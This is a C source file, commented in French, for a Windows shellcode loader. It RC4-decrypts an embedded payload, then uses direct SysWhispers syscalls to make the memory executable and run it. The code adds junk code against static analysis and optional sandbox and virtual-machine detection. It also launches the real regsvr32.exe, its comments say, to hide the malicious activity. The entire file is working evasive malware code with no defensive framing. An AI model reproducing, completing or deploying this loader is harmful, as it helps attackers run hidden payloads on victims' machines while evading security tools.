#include <windows.h>
#include <string.h>
#include <time.h>
#include <stdio.h>
#include "syscalls.h"
#include "encrypted_payload.h"

// Active (1) ou désactive (0) la vérification de l'environnement sandbox
#define ENABLE_SANDBOX_CHECK 0

// Fonction RC4 pour chiffrer/déchiffrer les données en mémoire
void rc4(unsigned char *data, unsigned int len, const unsigned char *key, unsigned int keylen) {
    unsigned char S[256];

    // Initialisation du tableau de permutation S-box
    for (int i = 0; i < 256; i++) S[i] = i;

    // Key-Scheduling Algorithm (KSA) : mélange de la S-box selon la clé
    for (int i = 0, j = 0; i < 256; i++) {
        j = (j + S[i] + key[i % keylen]) % 256;
        unsigned char tmp = S[i]; S[i] = S[j]; S[j] = tmp;
    }

    // Pseudo-Random Generation Algorithm (PRGA) pour chiffrer/déchiffrer
    for (unsigned int i = 0, j = 0, k = 0; k < len; k++) {
        i = (i + 1) % 256;
        j = (j + S[i]) % 256;
        unsigned char tmp = S[i]; S[i] = S[j]; S[j] = tmp;
        data[k] ^= S[(S[i] + S[j]) % 256];
    }
}

// Fonction inutile pour brouiller l'analyse statique (obfuscation légère)
void junk() {
    int a = rand() % 123;
    if (a == 42) { MessageBoxA(NULL, "Noise", "Filler", MB_OK); }
}

// Fonction de vérification pour détecter un environnement sandbox
BOOL is_sandbox_environment() {
    MEMORYSTATUSEX memStat;
    memStat.dwLength = sizeof(memStat);
    GlobalMemoryStatusEx(&memStat);
    // Vérifie la mémoire physique inférieure à 2 Go
    if (memStat.ullTotalPhys / (1024 * 1024) < 2048) return TRUE;

    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    // Vérifie si le nombre de processeurs est inférieur à 2
    if (sysInfo.dwNumberOfProcessors < 2) return TRUE;

    LASTINPUTINFO lii;
    lii.cbSize = sizeof(lii);
    GetLastInputInfo(&lii);
    DWORD idle = GetTickCount() - lii.dwTime;
    // Vérifie si le système est inactif depuis plus de 5 minutes
    if (idle > 300000) return TRUE;

    // Vérifie si le système vient tout juste de démarrer (moins de 30 sec)
    if (GetTickCount() < 30000) return TRUE;

    // Vérification si le système est une machine virtuelle (VMware, VirtualBox, QEMU, Xen)
    HKEY hKey;
    char value[256];
    DWORD size = sizeof(value);
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System\\BIOS", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        if (RegQueryValueExA(hKey, "SystemManufacturer", NULL, NULL, (LPBYTE)value, &size) == ERROR_SUCCESS) {
            if (strstr(value, "VMware") || strstr(value, "VirtualBox") || strstr(value, "QEMU") || strstr(value, "Xen")) {
                RegCloseKey(hKey);
                return TRUE;
            }
        }
        size = sizeof(value);
        if (RegQueryValueExA(hKey, "BIOSVendor", NULL, NULL, (LPBYTE)value, &size) == ERROR_SUCCESS) {
            if (strstr(value, "SeaBIOS") || strstr(value, "VBox") || strstr(value, "VMware")) {
                RegCloseKey(hKey);
                return TRUE;
            }
        }
        RegCloseKey(hKey);
    }
    return FALSE;
}

// Fonction principale du programme (entrée Windows)
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    srand((unsigned int)time(NULL));
    junk(); // Appel de la fonction junk pour brouiller les analyses

    // Optionnel : Vérification sandbox, si activée
#if ENABLE_SANDBOX_CHECK
    if (is_sandbox_environment()) {
        Sw3NtTerminateProcess(GetCurrentProcess(), 0); // termine le processus immédiatement
    }
#endif

    // Allocation mémoire pour le payload via SysWhispers (syscall direct)
    PVOID baseAddr = NULL;
    SIZE_T regionSize = payload_len;
    ULONG oldProtect = 0;

    if (Sw3NtAllocateVirtualMemory(GetCurrentProcess(), &baseAddr, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) == 0) {
        memcpy(baseAddr, payload, payload_len); // Copie du payload dans la mémoire allouée
        rc4((unsigned char *)baseAddr, payload_len, (unsigned char *)"hola", strlen("hola")); // Déchiffrement RC4 du payload

        // Rend la mémoire exécutable (RX)
        if (Sw3NtProtectVirtualMemory(GetCurrentProcess(), &baseAddr, &regionSize, PAGE_EXECUTE_READ, &oldProtect) == 0) {
            ((void(*)())baseAddr)(); // Exécution du payload déchiffré en mémoire
        } else {
            Sw3NtTerminateProcess(GetCurrentProcess(), 2); // Échec, arrêt immédiat
        }
    } else {
        Sw3NtTerminateProcess(GetCurrentProcess(), 1); // Échec, arrêt immédiat
    }

    // Exécution légitime du vrai regsvr32.exe pour masquer l'activité malveillante
    char sysPath[MAX_PATH] = {0};
    GetSystemDirectoryA(sysPath, MAX_PATH);
    strcat(sysPath, "\\regsvr32.exe");

    char cmdLine[1024];
    snprintf(cmdLine, sizeof(cmdLine), "\"%s\" %s", sysPath, lpCmdLine);

    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    if (CreateProcessA(NULL, cmdLine, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    // Terminaison propre du processus courant via syscall direct (SysWhispers)
    Sw3NtTerminateProcess(GetCurrentProcess(), 0);
}
